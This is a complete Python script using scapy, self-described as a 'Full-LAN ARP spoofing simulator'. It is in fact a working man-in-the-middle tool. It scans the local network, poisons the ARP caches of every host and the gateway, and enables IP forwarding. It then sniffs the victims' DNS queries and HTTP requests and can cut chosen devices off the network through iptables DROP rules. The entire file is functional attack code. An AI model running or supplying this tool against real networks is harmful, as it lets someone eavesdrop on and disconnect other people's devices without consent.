import sys
import os
import time
import signal
import argparse
import threading
import subprocess

from scapy.all import (
    ARP, Ether, IP, TCP, UDP, DNS, DNSQR, Raw,
    srp, sendp, sniff, get_if_hwaddr, get_if_addr,
)

SPOOF_INTERVAL_SEC = 2
DISCOVER_TIMEOUT_SEC = 4

IP_FORWARD_PATH = "/proc/sys/net/ipv4/ip_forward"


def discover_hosts(iface: str, cidr: str, exclude_ips) -> dict:
    print(f"[*] Scanning {cidr} on {iface} for hosts (this takes a few seconds)...")
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr)
    answered, _ = srp(pkt, iface=iface, timeout=DISCOVER_TIMEOUT_SEC, verbose=False)

    hosts = {}
    for _, reply in answered:
        ip, mac = reply.psrc, reply.hwsrc
        if ip in exclude_ips:
            continue
        hosts[ip] = mac
    return hosts


def read_ip_forward() -> str:
    try:
        with open(IP_FORWARD_PATH) as f:
            return f.read().strip()
    except OSError:
        return "0"


def write_ip_forward(value: str) -> None:
    try:
        with open(IP_FORWARD_PATH, "w") as f:
            f.write(value)
    except OSError as e:
        print(f"[!] Could not set ip_forward: {e}")


def send_spoofed_reply(target_ip, target_mac, impersonated_ip, my_mac, iface):
    pkt = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=impersonated_ip, hwsrc=my_mac,
    )
    sendp(pkt, iface=iface, verbose=False)


def send_restore_reply(target_ip, target_mac, real_ip, real_mac, iface):
    pkt = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=real_ip, hwsrc=real_mac,
    )
    sendp(pkt, iface=iface, count=2, verbose=False)


def describe_packet(pkt, target_ips: set) -> str:
    if not pkt.haslayer(IP):
        return None
    ip_layer = pkt[IP]
    src, dst = ip_layer.src, ip_layer.dst
    if src not in target_ips and dst not in target_ips:
        return None

    me = src if src in target_ips else dst
    other = dst if src in target_ips else src
    direction = "->" if src in target_ips else "<-"

    proto, extra = "IP", ""
    if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
        proto = "DNS"
        try:
            extra = f"query: {pkt[DNSQR].qname.decode(errors='replace')}"
        except Exception:
            extra = f"query: {pkt[DNSQR].qname}"
    elif pkt.haslayer(TCP):
        proto = "TCP"
        sport, dport = pkt[TCP].sport, pkt[TCP].dport
        extra = f"port {sport}->{dport}"
        if pkt.haslayer(Raw) and (dport in (80, 8080) or sport in (80, 8080)):
            try:
                payload = bytes(pkt[Raw].load)
                host_lines = [l for l in payload.split(b"\r\n") if l.startswith(b"Host:")]
                if host_lines:
                    extra += f"  Host: {host_lines[0].split(b':',1)[1].strip().decode(errors='replace')}"
                first_line = payload.split(b"\r\n")[0].decode(errors="replace")
                if first_line.startswith(("GET", "POST", "PUT", "DELETE", "HEAD")):
                    extra += f"  {first_line}"
            except Exception:
                pass
    elif pkt.haslayer(UDP):
        proto = "UDP"
        extra = f"port {pkt[UDP].sport}->{pkt[UDP].dport}"

    return f"[{proto}] {me} {direction} {other}  {extra}".rstrip()


def sniff_traffic(iface: str, target_ips: set, stop_event: threading.Event):
    def on_packet(pkt):
        line = describe_packet(pkt, target_ips)
        if line:
            print(line)

    bpf_filter = " or ".join(f"host {ip}" for ip in target_ips)
    sniff(
        iface=iface,
        filter=bpf_filter,
        prn=on_packet,
        store=False,
        stop_filter=lambda pkt: stop_event.is_set(),
    )


class Blocker:
    def __init__(self):
        self.blocked = set()
        self._lock = threading.Lock()

    def _run(self, args):
        subprocess.run(["iptables"] + args, check=False)

    def block(self, ip: str):
        with self._lock:
            if ip in self.blocked:
                print(f"[*] {ip} already blocked.")
                return
            self._run(["-I", "FORWARD", "-s", ip, "-j", "DROP"])
            self._run(["-I", "FORWARD", "-d", ip, "-j", "DROP"])
            self.blocked.add(ip)
            print(f"[*] Blocked {ip} — cut off from the network.")

    def allow(self, ip: str):
        with self._lock:
            if ip not in self.blocked:
                print(f"[*] {ip} already allowed.")
                return
            self._run(["-D", "FORWARD", "-s", ip, "-j", "DROP"])
            self._run(["-D", "FORWARD", "-d", ip, "-j", "DROP"])
            self.blocked.discard(ip)
            print(f"[*] Allowed {ip} — traffic forwarded again.")

    def cleanup(self):
        with self._lock:
            for ip in list(self.blocked):
                self._run(["-D", "FORWARD", "-s", ip, "-j", "DROP"])
                self._run(["-D", "FORWARD", "-d", ip, "-j", "DROP"])
            self.blocked.clear()


def command_loop(blocker: Blocker, targets: dict, stop_event: threading.Event):
    print("[*] Commands: 'list' | 'block <ip|all>' | 'allow <ip|all>' | 'quit'")
    while not stop_event.is_set():
        try:
            line = input().strip()
        except EOFError:
            break
        parts = line.split()
        if not parts:
            continue
        cmd = parts[0].lower()

        if cmd == "list":
            for ip, mac in targets.items():
                status = "BLOCKED" if ip in blocker.blocked else "allowed"
                print(f"    {ip:15s} {mac}  [{status}]")
        elif cmd == "block" and len(parts) == 2:
            arg = parts[1].lower()
            if arg == "all":
                for ip in targets:
                    blocker.block(ip)
            elif parts[1] in targets:
                blocker.block(parts[1])
            else:
                print(f"[!] {parts[1]} is not a known target.")
        elif cmd == "allow" and len(parts) == 2:
            arg = parts[1].lower()
            if arg == "all":
                for ip in targets:
                    blocker.allow(ip)
            elif parts[1] in targets:
                blocker.allow(parts[1])
            else:
                print(f"[!] {parts[1]} is not a known target.")
        elif cmd in ("quit", "exit", "q"):
            stop_event.set()
            break
        else:
            print(f"[!] Unknown command (received: {line!r}). Use: list | block <ip|all> | allow <ip|all> | quit")


def main():
    parser = argparse.ArgumentParser(description="Full-LAN ARP spoofing simulator")
    parser.add_argument("interface", help="network interface, e.g. enp1s0")
    parser.add_argument("gateway_ip", help="IP of the gateway/router")
    parser.add_argument("--cidr", default="24", help="subnet size for auto-discovery (default 24)")
    parser.add_argument("--targets", help="comma-separated IP list instead of auto-discovering the whole LAN")
    parser.add_argument("--no-sniff", action="store_true", help="disable traffic printing")
    parser.add_argument("--block", help="comma-separated IPs to block from the start, or 'all'")
    args = parser.parse_args()

    if os.geteuid() != 0:
        sys.exit("Must be run as root (raw sockets + iptables).")

    iface = args.interface
    gateway_ip = args.gateway_ip
    my_mac = get_if_hwaddr(iface)
    my_ip = get_if_addr(iface)
    print(f"[*] Interface: {iface}  MAC: {my_mac}  IP: {my_ip}")

    if args.targets:
        target_ips = [ip.strip() for ip in args.targets.split(",") if ip.strip()]
        print(f"[*] Resolving {len(target_ips)} specified target(s)...")
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ips)
        answered, _ = srp(pkt, iface=iface, timeout=DISCOVER_TIMEOUT_SEC, verbose=False)
        targets = {r[1].psrc: r[1].hwsrc for r in answered}
    else:
        network = ".".join(my_ip.split(".")[:3]) + f".0/{args.cidr}"
        targets = discover_hosts(iface, network, exclude_ips={my_ip, gateway_ip})

    if not targets:
        sys.exit("[!] No targets found. Check the interface/network and try again.")

    print(f"[*] Found {len(targets)} target(s):")
    for ip, mac in targets.items():
        print(f"    {ip:15s} {mac}")

    print(f"[*] Resolving gateway MAC ({gateway_ip})...")
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway_ip)
    answered, _ = srp(pkt, iface=iface, timeout=DISCOVER_TIMEOUT_SEC, verbose=False)
    if not answered:
        sys.exit("[!] Could not resolve gateway MAC.")
    gateway_mac = answered[0][1].hwsrc
    print(f"    -> {gateway_mac}")

    orig_forward = read_ip_forward()
    print(f"[*] Enabling IP forwarding (was {orig_forward})")
    write_ip_forward("1")

    stop = threading.Event()
    blocker = Blocker()

    if args.block:
        if args.block.strip().lower() == "all":
            block_ips = list(targets.keys())
        else:
            block_ips = [ip.strip() for ip in args.block.split(",") if ip.strip()]
        for ip in block_ips:
            if ip in targets:
                blocker.block(ip)
            else:
                print(f"[!] --block: {ip} is not among the discovered targets, skipping.")

    def handle_sigint(signum, frame):
        stop.set()

    signal.signal(signal.SIGINT, handle_sigint)

    sniff_thread = None
    if not args.no_sniff:
        sniff_thread = threading.Thread(
            target=sniff_traffic, args=(iface, set(targets.keys()), stop), daemon=True
        )
        sniff_thread.start()

    cmd_thread = threading.Thread(target=command_loop, args=(blocker, targets, stop), daemon=True)
    cmd_thread.start()

    print(f"[*] Spoofing {len(targets)} device(s). Ctrl+C or 'quit' to stop and restore.\n")

    try:
        while not stop.is_set():
            for ip, mac in targets.items():
                send_spoofed_reply(ip, mac, gateway_ip, my_mac, iface)
                send_spoofed_reply(gateway_ip, gateway_mac, ip, my_mac, iface)
            for _ in range(SPOOF_INTERVAL_SEC * 10):
                if stop.is_set():
                    break
                time.sleep(0.1)
    finally:
        stop.set()
        print("\n[*] Stopping — restoring ARP tables for all targets...")
        blocker.cleanup()
        for ip, mac in targets.items():
            send_restore_reply(ip, mac, gateway_ip, gateway_mac, iface)
            send_restore_reply(gateway_ip, gateway_mac, ip, mac, iface)

        print(f"[*] Restoring IP forwarding to {orig_forward}")
        write_ip_forward(orig_forward)

        if sniff_thread is not None:
            sniff_thread.join(timeout=3)

        print("[*] Done.")


if __name__ == "__main__":
    main()
